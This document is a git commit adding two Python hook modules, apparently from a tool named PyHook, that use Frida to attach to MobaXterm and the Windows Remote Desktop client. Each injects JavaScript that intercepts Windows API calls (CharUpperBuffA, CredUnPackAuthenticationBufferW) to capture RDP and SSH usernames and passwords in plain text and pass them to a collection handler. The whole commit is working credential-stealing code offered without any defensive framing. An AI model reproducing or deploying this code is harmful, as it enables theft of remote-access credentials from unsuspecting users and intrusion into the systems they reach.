073b1d4b31a4645de23cca8efbd7ccbed3db502a
LXTreato <lidor.cats123@gmail.com>
2021-09-05 16:50:42 +0300

    major code refactor

---
+++ hooks/mobaxterm.py
@@ -0,0 +1,45 @@
+from PyHook import wait_for_process, on_credential_submit
+import frida
+
+
+def wait_for():
+    wait_for_process(["MobaXterm.exe"], "MobaXterm", hook)
+
+
+def hook(pid):
+    try:
+        print("[+] Trying To Attach To MobaXterm")
+        session = frida.attach(pid)
+        print(f"[+] Attached to MobaXterm pid {pid}!")
+        script = session.create_script("""
+
+		var creds;
+		var CharUpperBuffA = Module.findExportByName("User32.dll", "CharUpperBuffA")
+		Interceptor.attach(CharUpperBuffA, {
+			onEnter: function (args) 
+			{
+				creds = args[0];
+				var data = creds.readAnsiString()
+
+				if (data)
+				{
+					if(data.includes("rdp:"))
+					{
+						send("\\n=============================" + "\\n[+] Intercepted Creds from MobaXtermRDP" +"\\n"+ "Keyword    : " + data + "\\n=============================");
+					}
+					if(data.includes(", 22 ,"))
+					{
+						send("\\n=============================" + "\\n[+] Intercepted Creds from MobaXtermSSH" +"\\n"+ "Keyword    : " + data + "\\n=============================");
+					}
+
+				}	
+			}
+		});
+
+		""")
+        script.on('message', on_credential_submit)
+        script.load()
+
+    except Exception as e:
+        print("[-] Unhandled exception: " + str(e))
+        print("[-] Continuing...")
---
+++ hooks/rdp.py
@@ -0,0 +1,48 @@
+import frida
+from PyHook import wait_for_process, on_credential_submit
+
+
+def wait_for():
+    wait_for_process(["mstsc.exe"], "RDP", hook)
+
+
+def hook(pid):
+    try:
+        print("[+] Trying To Attach To RDP")
+        session = frida.attach(pid)
+        print(f"[+] Attached To RDP with pid {pid}!")
+
+        # We Listen to the CredUnPackAuthenticationBufferW func from Credui.dll to catch the user and pass in plain text
+        hook = session.create_script("""
+
+        var username;
+        var password;
+        var CredUnPackAuthenticationBufferW = Module.findExportByName("Credui.dll", "CredUnPackAuthenticationBufferW")
+
+        Interceptor.attach(CredUnPackAuthenticationBufferW, {
+            onEnter: function (args) 
+            {
+
+                username = args[3];
+                password = args[7];
+            },
+            onLeave: function (result)
+            {
+
+                var user = username.readUtf16String()
+                var pass = password.readUtf16String()
+
+                if (user && pass)
+                {
+                   send("\\n=============================" + "\\n[+] Intercepted Creds from RDP" + "\\nUsername    : " + user + "\\nPassword    : " + pass +"\\n=============================" );
+                }
+            }
+        });
+
+        """)
+        hook.on('message', on_credential_submit)
+        hook.load()
+
+    except Exception as e:
+        print("[-] Unhandled exception: " + str(e))
+        print("[-] Continuing...")
